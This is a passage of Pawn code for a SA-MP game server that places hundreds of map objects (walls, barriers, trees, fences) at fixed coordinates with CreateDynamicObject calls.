	CreateDynamicObject(9131, 1475.46118, -1744.19299, 12.77580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1479.58130, -1744.19299, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1483.68225, -1744.19299, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1487.54932, -1744.19299, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 1491.13086, -1744.19299, 11.37770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1280, 1468.15613, -1704.64063, 13.45310,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1256, 1489.39319, -1745.03418, 13.06640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1256, 1473.30066, -1745.03418, 13.06640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1256, 1485.70166, -1745.03845, 13.06640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1256, 1481.64990, -1745.03186, 13.06640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1256, 1477.52795, -1745.03418, 13.06640,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(9339, 1504.35754, -1721.80859, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19372, 1500.22571, -1604.30298, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(9339, 1439.80774, -1708.28015, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1613.86792, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(9339, 1454.69470, -1602.82666, 13.23330,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7922, 1490.55652, -1603.40674, 12.56070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7922, 1443.77246, -1606.35815, 12.56070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1607.49109, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1610.69324, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1617.07007, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1633.04541, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(9339, 1443.04456, -1618.69824, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1443.04456, -1670.89441, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1443.04456, -1696.99536, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1443.04456, -1705.87915, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1439.80774, -1616.06555, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1439.80774, -1642.12280, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1439.80774, -1668.19727, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1439.80774, -1694.27185, 13.23330,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7922, 1468.66101, -1721.25952, 12.56070,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(1216, 1459.99780, -1672.34241, 13.69380,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1216, 1459.99780, -1669.10205, 13.69380,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19372, 1441.43335, -1620.27087, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1623.46509, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1626.65076, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1629.84033, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1636.22607, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1639.40710, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1642.60803, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1645.78772, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1648.94861, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1652.12939, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1655.29028, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1658.46985, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1661.67041, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.41370, -1664.82959, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.41528, -1668.01245, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1671.19434, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1674.37500, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1677.56458, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1680.75769, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1683.93140, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1687.09485, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1690.27344, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1693.42725, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1696.59277, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1699.75830, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1702.95190, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1706.13110, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1709.33606, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1712.52136, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43335, -1715.70691, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1441.43164, -1717.89709, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1444.88855, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1448.37244, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1451.81494, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1455.27795, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1458.71912, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1462.16370, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1465.64355, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(7922, 1490.41150, -1605.05505, 12.56070,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(7922, 1468.61023, -1605.22681, 12.56070,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(19372, 1444.86462, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1448.34949, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1451.83459, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1455.31506, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1458.77466, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1462.21667, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1465.69751, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19372, 1467.21936, -1604.30774, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3517, 1490.90576, -1604.49829, 24.13828,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3517, 1467.64050, -1604.49829, 24.13830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7922, 1490.54907, -1719.34839, 12.56070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(7922, 1468.80725, -1719.49731, 12.56070,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19372, 1467.35889, -1720.33887, 13.44440,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3517, 1517.49304, -1720.52698, 24.13830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3517, 1491.18225, -1720.52698, 24.13830,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3517, 1467.63550, -1720.52698, 24.13830,   0.00000, 0.00000, 51.77998);
	CreateDynamicObject(19355, 1466.47595, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1460.07471, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1495.77698, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1498.97607, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1502.17493, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1508.57886, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1511.77905, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1514.97961, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1518.18018, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1521.38220, -1767.89905, 12.15010,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19355, 1439.17480, -1772.62988, 12.15010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19355, 1522.89880, -1769.41418, 12.15010,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19381, 1465.39087, -1772.65173, 13.60340,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1517.70349, -1772.65173, 13.60340,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19381, 1496.85779, -1772.65173, 13.60340,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3517, 1441.39429, -1720.52698, 24.13830,   0.00000, 0.00000, 51.78000);
	CreateDynamicObject(7922, 1440.37476, -1721.11865, 12.56070,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(737, 1511.97388, -1720.29492, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1461.86682, -1604.24084, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1453.65161, -1604.21423, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1446.62378, -1604.19666, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1517.78528, -1618.23267, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1618.23267, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1626.03723, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1634.28357, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1642.69739, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1651.41357, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1659.94446, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1669.20435, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1677.59705, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1686.12793, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1695.60400, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.33545, -1704.14124, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1441.35437, -1712.53979, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1511.97388, -1604.31995, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1504.17871, -1720.31665, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1495.79504, -1720.31494, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1461.86682, -1720.29492, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1453.65161, -1720.29492, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(737, 1446.62378, -1720.29492, 13.30450,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1383, 1587.18872, -1969.09692, 80.56090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1383, 1166.72693, -1962.56531, 102.75631,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19911, 1364.76489, -1902.44617, 19.28480,   0.00000, 0.00000, 86.10000);
	CreateDynamicObject(19911, 1431.20630, -1882.26477, 15.64100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1440.50903, -1882.26477, 15.64100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19975, 1417.86401, -1881.85364, 11.62520,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(19975, 1435.67041, -1881.85364, 11.62518,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(19911, 1421.70813, -1882.26477, 15.64100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1393.55920, -1902.76794, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1383.96057, -1902.76794, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1290.72998, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1374.36133, -1902.76794, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1300.32910, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1281.14661, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1271.56580, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1261.98633, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1252.38550, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1242.78516, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1228.54211, -1895.00146, 19.28480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19911, 1194.89404, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1228.54211, -1885.39856, 19.28480,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19911, 1233.30750, -1880.63403, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1223.69910, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1214.09363, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1204.48535, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1185.28088, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1175.68225, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1166.05103, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1156.44788, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1146.84924, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1137.24036, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1127.62500, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1108.47498, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1118.03918, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1098.91382, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1089.28992, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1079.68604, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1071.45215, -1895.96570, 19.28480,   0.00000, 0.00000, 2.34000);
	CreateDynamicObject(19911, 1076.01587, -1891.10144, 19.28480,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1071.88354, -1905.57385, 19.28480,   0.00000, 0.00000, 2.82000);
	CreateDynamicObject(19911, 1072.38916, -1915.14136, 19.28480,   0.00000, 0.00000, 3.30000);
	CreateDynamicObject(19911, 1087.37854, -2308.79614, 28.85920,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1073.08789, -1934.27112, 19.28480,   0.00000, 0.00000, -1.92000);
	CreateDynamicObject(19911, 1072.75537, -1943.80542, 19.28480,   0.00000, 0.00000, -1.92000);
	CreateDynamicObject(19911, 1072.45618, -1952.45227, 19.28480,   0.00000, 0.00000, -1.92000);
	CreateDynamicObject(19911, 1071.77454, -1955.02161, 19.28480,   0.00000, 0.00000, -8.82000);
	CreateDynamicObject(19911, 1071.08057, -1973.44141, 19.28480,   0.00000, 0.00000, 17.64001);
	CreateDynamicObject(19911, 1070.34521, -1964.12463, 19.28480,   0.00000, 0.00000, -8.82000);
	CreateDynamicObject(19911, 1072.95178, -1924.68701, 19.28480,   0.00000, 0.00000, 3.54000);
	CreateDynamicObject(19911, 1093.45007, -2316.19873, 28.85920,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1093.45007, -2316.19873, 22.51875,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1093.45007, -2316.19873, 16.15306,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1105.59888, -2331.04150, 16.15306,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1099.52405, -2323.61450, 22.51870,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1099.52405, -2323.61450, 16.15306,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1105.59888, -2331.04150, 22.51870,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1112.47778, -2337.60986, 16.15306,   0.00000, 0.00000, 53.22003);
	CreateDynamicObject(19911, 1120.90576, -2341.86523, 16.15306,   0.00000, 0.00000, 73.26005);
	CreateDynamicObject(19911, 1129.73169, -2343.42822, 16.15306,   0.00000, 0.00000, 85.92004);
	CreateDynamicObject(19911, 1139.29382, -2344.10059, 16.15306,   0.00000, 0.00000, 85.92004);
	CreateDynamicObject(19911, 1148.84192, -2344.47290, 16.15306,   0.00000, 0.00000, 89.34003);
	CreateDynamicObject(19911, 1158.23584, -2343.21753, 16.15306,   0.00000, 0.00000, 106.08001);
	CreateDynamicObject(19911, 1166.76563, -2339.12500, 16.15306,   0.00000, 0.00000, 125.21999);
	CreateDynamicObject(19911, 1174.32642, -2333.20972, 16.15306,   0.00000, 0.00000, 130.80006);
	CreateDynamicObject(19911, 1182.64771, -2329.13550, 16.15306,   0.00000, 0.00000, 101.16018);
	CreateDynamicObject(19911, 1191.30701, -2325.51245, 16.15306,   0.00000, 0.00000, 124.26022);
	CreateDynamicObject(19911, 1199.23181, -2320.10522, 16.15306,   0.00000, 0.00000, 124.26022);
	CreateDynamicObject(19911, 1204.85608, -2312.90479, 16.15306,   0.00000, 0.00000, 160.02002);
	CreateDynamicObject(19911, 1208.11133, -2303.89478, 16.15306,   0.00000, 0.00000, 160.02002);
	CreateDynamicObject(19911, 1211.38696, -2294.93237, 16.15306,   0.00000, 0.00000, 160.02002);
	CreateDynamicObject(19911, 1214.66772, -2285.91284, 16.15306,   0.00000, 0.00000, 160.02002);
	CreateDynamicObject(19911, 1211.38696, -2294.93237, 9.81399,   0.00000, 0.00000, 160.02002);
	CreateDynamicObject(19911, 1214.66772, -2285.91284, 9.81400,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1112.47778, -2337.60986, 22.51870,   0.00000, 0.00000, 53.22000);
	CreateDynamicObject(19911, 1120.90576, -2341.86523, 22.51870,   0.00000, 0.00000, 73.26000);
	CreateDynamicObject(19911, 1129.73169, -2343.42822, 22.51870,   0.00000, 0.00000, 85.92000);
	CreateDynamicObject(19911, 1139.29382, -2344.10059, 22.51870,   0.00000, 0.00000, 85.92000);
	CreateDynamicObject(19911, 1148.84192, -2344.47290, 22.51870,   0.00000, 0.00000, 89.34000);
	CreateDynamicObject(19911, 1158.23584, -2343.21753, 22.51870,   0.00000, 0.00000, 106.08000);
	CreateDynamicObject(19911, 1166.76563, -2339.12500, 22.51870,   0.00000, 0.00000, 125.22000);
	CreateDynamicObject(19911, 1174.32642, -2333.20972, 22.51870,   0.00000, 0.00000, 130.80009);
	CreateDynamicObject(19911, 1182.64771, -2329.13550, 22.51870,   0.00000, 0.00000, 101.16020);
	CreateDynamicObject(762, 1178.23438, -2315.78125, 17.07813,   3.14159, 0.00000, 0.04781);
	CreateDynamicObject(19911, 1191.30701, -2325.51245, 22.51870,   0.00000, 0.00000, 124.26020);
	CreateDynamicObject(19911, 1199.23181, -2320.10522, 22.51870,   0.00000, 0.00000, 124.26020);
	CreateDynamicObject(19911, 1204.85608, -2312.90479, 22.51870,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1208.11133, -2303.89478, 22.51870,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1211.38696, -2294.93237, 22.51870,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1214.66772, -2285.91284, 22.51870,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1217.36890, -2276.72778, 16.15306,   0.00000, 0.00000, 167.39989);
	CreateDynamicObject(19911, 1218.38000, -2267.23535, 16.15306,   0.00000, 0.00000, 180.35992);
	CreateDynamicObject(19911, 1217.36890, -2276.72778, 9.81400,   0.00000, 0.00000, 167.39990);
	CreateDynamicObject(19911, 1218.38000, -2267.23535, 9.81400,   0.00000, 0.00000, 180.35989);
	CreateDynamicObject(19911, 1217.36890, -2276.72778, 22.51870,   0.00000, 0.00000, 167.39990);
	CreateDynamicObject(19911, 1218.38000, -2267.23535, 22.51870,   0.00000, 0.00000, 180.35989);
	CreateDynamicObject(19911, 1219.30884, -2257.70874, 16.15306,   0.00000, 0.00000, 168.60020);
	CreateDynamicObject(19911, 1219.30884, -2257.70874, 22.51870,   0.00000, 0.00000, 168.60020);
	CreateDynamicObject(19911, 1222.23425, -2248.64771, 22.51870,   0.00000, 0.00000, 155.76030);
	CreateDynamicObject(19911, 1222.23425, -2248.64771, 28.87142,   0.00000, 0.00000, 155.76030);
	CreateDynamicObject(19911, 1227.07458, -2240.42773, 28.87142,   0.00000, 0.00000, 143.34024);
	CreateDynamicObject(19911, 1232.67383, -2232.66235, 28.87142,   0.00000, 0.00000, 145.08017);
	CreateDynamicObject(19911, 1238.10754, -2224.77100, 28.87142,   0.00000, 0.00000, 145.38016);
	CreateDynamicObject(19911, 1243.57715, -2216.87402, 28.87142,   0.00000, 0.00000, 145.38016);
	CreateDynamicObject(19911, 1249.56824, -2209.42627, 28.87142,   0.00000, 0.00000, 137.16042);
	CreateDynamicObject(19911, 1256.20679, -2202.51416, 28.87142,   0.00000, 0.00000, 135.18050);
	CreateDynamicObject(19911, 1263.07324, -2195.78394, 28.87142,   0.00000, 0.00000, 133.38057);
	CreateDynamicObject(19911, 1270.25537, -2189.46509, 28.87142,   0.00000, 0.00000, 129.30058);
	CreateDynamicObject(19911, 1278.52197, -2184.89526, 28.87142,   0.00000, 0.00000, 108.48064);
	CreateDynamicObject(19911, 1287.27258, -2181.03369, 28.87142,   0.00000, 0.00000, 118.98062);
	CreateDynamicObject(19911, 1296.18860, -2177.91577, 28.87142,   0.00000, 0.00000, 99.42064);
	CreateDynamicObject(19911, 1305.65002, -2176.52856, 28.87142,   0.00000, 0.00000, 97.08065);
	CreateDynamicObject(19911, 1314.70984, -2173.76685, 28.87142,   0.00000, 0.00000, 116.70059);
	CreateDynamicObject(19911, 1323.18958, -2169.26514, 28.87142,   0.00000, 0.00000, 119.22063);
	CreateDynamicObject(19911, 1331.38428, -2164.31421, 28.87142,   0.00000, 0.00000, 122.94055);
	CreateDynamicObject(19911, 1339.21069, -2158.82715, 28.87142,   0.00000, 0.00000, 127.26036);
	CreateDynamicObject(19911, 1346.40735, -2152.48779, 28.87142,   0.00000, 0.00000, 135.66034);
	CreateDynamicObject(19911, 1339.21069, -2158.82715, 22.49651,   0.00000, 0.00000, 127.26036);
	CreateDynamicObject(19911, 1346.40735, -2152.48779, 22.49650,   0.00000, 0.00000, 135.66029);
	CreateDynamicObject(19911, 1352.76697, -2145.30811, 28.87142,   0.00000, 0.00000, 141.06027);
	CreateDynamicObject(19911, 1358.79565, -2137.86255, 28.87142,   0.00000, 0.00000, 141.06027);
	CreateDynamicObject(19911, 1365.68335, -2131.26904, 28.87142,   0.00000, 0.00000, 126.48033);
	CreateDynamicObject(19911, 1373.65759, -2126.02734, 28.87142,   0.00000, 0.00000, 120.48037);
	CreateDynamicObject(19911, 1381.91028, -2121.13940, 28.87142,   0.00000, 0.00000, 120.48037);
	CreateDynamicObject(19911, 1390.35522, -2116.57959, 28.87142,   0.00000, 0.00000, 116.10037);
	CreateDynamicObject(19911, 1399.21545, -2112.88599, 28.87142,   0.00000, 0.00000, 109.14028);
	CreateDynamicObject(19911, 1408.30042, -2109.75244, 28.87142,   0.00000, 0.00000, 109.14028);
	CreateDynamicObject(19911, 1417.53979, -2107.10376, 28.87142,   0.00000, 0.00000, 102.60028);
	CreateDynamicObject(19911, 1426.96533, -2105.40845, 28.87142,   0.00000, 0.00000, 98.10027);
	CreateDynamicObject(19911, 1436.51196, -2104.56738, 28.87142,   0.00000, 0.00000, 91.56021);
	CreateDynamicObject(19911, 1436.51196, -2104.56738, 22.48426,   0.00000, 0.00000, 91.56021);
	CreateDynamicObject(19911, 1446.08264, -2103.83252, 28.87142,   0.00000, 0.00000, 97.26018);
	CreateDynamicObject(19911, 1446.08264, -2103.83252, 22.48430,   0.00000, 0.00000, 97.26020);
	CreateDynamicObject(19911, 1455.64453, -2103.11060, 28.87142,   0.00000, 0.00000, 91.44019);
	CreateDynamicObject(19911, 1465.22729, -2102.86743, 28.87142,   0.00000, 0.00000, 91.44019);
	CreateDynamicObject(19911, 1474.81006, -2102.64331, 28.87142,   0.00000, 0.00000, 91.44019);
	CreateDynamicObject(19911, 1484.37805, -2102.39526, 28.87142,   0.00000, 0.00000, 91.44019);
	CreateDynamicObject(19911, 1493.93958, -2102.51318, 28.87142,   0.00000, 0.00000, 87.06015);
	CreateDynamicObject(19911, 1503.44104, -2103.73242, 28.87142,   0.00000, 0.00000, 78.24005);
	CreateDynamicObject(19911, 1503.44104, -2103.73242, 22.47777,   0.00000, 0.00000, 78.24005);
	CreateDynamicObject(19911, 1512.93274, -2104.48218, 28.87142,   0.00000, 0.00000, 92.76004);
	CreateDynamicObject(19911, 1512.93274, -2104.48218, 22.47780,   0.00000, 0.00000, 92.76000);
	CreateDynamicObject(19911, 1522.40540, -2103.26147, 22.47780,   0.00000, 0.00000, 102.65992);
	CreateDynamicObject(19911, 1522.40540, -2103.26147, 28.87140,   0.00000, 0.00000, 102.65990);
	CreateDynamicObject(19911, 1522.40540, -2103.26147, 16.09604,   0.00000, 0.00000, 102.65992);
	CreateDynamicObject(19911, 1531.86877, -2102.78101, 22.47780,   0.00000, 0.00000, 83.21980);
	CreateDynamicObject(19911, 1531.86877, -2102.78101, 28.87140,   0.00000, 0.00000, 83.21980);
	CreateDynamicObject(19911, 1531.86877, -2102.78101, 16.09600,   0.00000, 0.00000, 83.21980);
	CreateDynamicObject(19911, 1538.15247, -2098.83765, 35.24730,   0.00000, 0.00000, 161.39960);
	CreateDynamicObject(19911, 1531.86877, -2102.78101, 35.24730,   0.00000, 0.00000, 83.21980);
	CreateDynamicObject(19911, 1538.15247, -2098.83765, 28.87140,   0.00000, 0.00000, 161.39960);
	CreateDynamicObject(19911, 1538.15247, -2098.83765, 22.47780,   0.00000, 0.00000, 161.39960);
	CreateDynamicObject(19911, 1538.15247, -2098.83765, 16.09600,   0.00000, 0.00000, 161.39960);
	CreateDynamicObject(19911, 1537.48108, -2090.04248, 35.24730,   0.00000, 0.00000, 207.17952);
